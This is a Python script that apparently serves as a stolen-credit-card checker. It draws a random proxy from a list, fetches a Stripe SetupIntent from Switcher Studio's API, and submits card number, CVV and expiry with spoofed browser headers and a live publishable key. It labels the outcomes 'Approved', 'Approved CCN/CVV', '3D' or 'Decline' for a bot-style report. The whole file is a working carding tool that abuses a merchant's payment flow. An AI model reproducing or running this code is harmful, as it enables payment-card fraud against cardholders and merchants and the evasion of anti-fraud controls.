import requests
import random
import json
import time
import base64
from bs4 import BeautifulSoup
from datetime import datetime, timedelta


def stripeM(username, numero, mes, ano, cvv): 
  proxyies = "proxy.txt"
  inicio = time.time()
  
  #BIN CHECKER
  
  #bin = numero[:6]
  
  #b_data = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()
  
  #pais = b_data['country_name']
  #flag = b_data['country_flag']
  #bank = b_data['bank']
  #brand = b_data['brand']
  #level = b_data['level']
  #tipo = b_data['type']
  

  
  
  with open("proxy.txt", "r") as f:
    proxy_list = [line.strip() for line in f if line.strip()]

  proxy_raw = random.choice(proxy_list)
  
    
  session = requests.Session()
  proxie = {
    "http": f"http://{proxy_raw}",
    "https": f"http://{proxy_raw}"
  }

  
  
  
  
  url = 'https://api.switcherstudio.com/api/StripeIntents/SetupIntent'
  
  headers = {
    'Accept': 'application/json',
    'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Origin': 'https://dashboard.switcherstudio.com',
    'Pragma': 'no-cache',
    'Referer': 'https://dashboard.switcherstudio.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Accept-Encoding': 'gzip'
  }
  
  decode_r = session.get(url, headers=headers, proxies=proxie).text 
  
  result = json.loads(decode_r)
  id = result['id']
  id2 = result['client_secret']

  
  
  
  url2 = 'https://api.stripe.com/v1/setup_intents/' + id + '/confirm'
  
  h2 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'accept-encoding': 'gzip'
  }
  
  data = {
     'return_url': 'https://dashboard.switcherstudio.com/getting-started?planId=SSMO49&isTrialing=true',
      'payment_method_data[type]': 'card',
      'payment_method_data[card][number]': numero,
      'payment_method_data[card][cvc]': cvv,
      'payment_method_data[card][exp_year]': ano,
      'payment_method_data[card][exp_month]': mes,
      'payment_method_data[billing_details][address][country]': 'GT',
      'payment_method_data[pasted_fields]': 'number',
      'payment_method_data[payment_user_agent]': 'stripe.js/d749fa7cbc;+stripe-js-v3/d749fa7cbc;+payment-element',
      'payment_method_data[time_on_page]': '117212',
      'payment_method_data[guid]': '68470569-0cea-40fa-b2b8-bedce477f3f76d9ef1',
      'payment_method_data[muid]': '3e6cc132-16c4-47fe-a259-e46e39bd48db2d2e5e',
      'payment_method_data[sid]': 'cd73ec66-9eb9-441a-92cf-24c5323dada44e5f5d',
      'expected_payment_method_type': 'card',
      'use_stripe_sdk': 'false',
      'key': 'pk_live_4M6W94FIwtPtRw97OP9aadh8',
      'client_secret': id2,

  }
  
  final = session.post(url2, headers=h2, data=data, proxies=proxie).json()
  
  end = time.time()
  tiempo = str(inicio - end)[1:5]

  print(final)
  
  try:
    rfinal = final['status']
    if "succeeded" in rfinal:
      
      msg = "Approved! ✅"
      code = "Succeeded"
    elif "requires_action" in rfinal:
      
      msg = "3D ⚠️"
      code = "3D Required"
    
  except KeyError:
      rend = final['error']['message']
      
      if "card_error_authentication_required" in rend:
        msg = "3D ⚠️"
        code = "3D Required"
        
      elif "Your card's security code is incorrect." in rend:
        
        msg = "Approved CCN! ✅"
        code = rend
        
      elif "Your card has insufficient funds" in rend:
        
        msg = "Approved CVV! ✅"
        code = rend
        
      elif "Your card's security code is invalid." in rend:
        
        msg = "Approved CCN! ✅"
        code = rend

      else:
        msg = "Decline! ❌"
        code = rend
  
  return (
    f"⋄ ︱ <b>CC</b>: {numero}|{mes}|{ano}|{cvv}\n"
    f"⋄ ︱ <b>Status</b>: {msg}\n"
    f"⋄ ︱ <b>Response</b>: {code}\n"
    f"⋄ ︱ <b>Checked By</b> : {username}\n"
  )
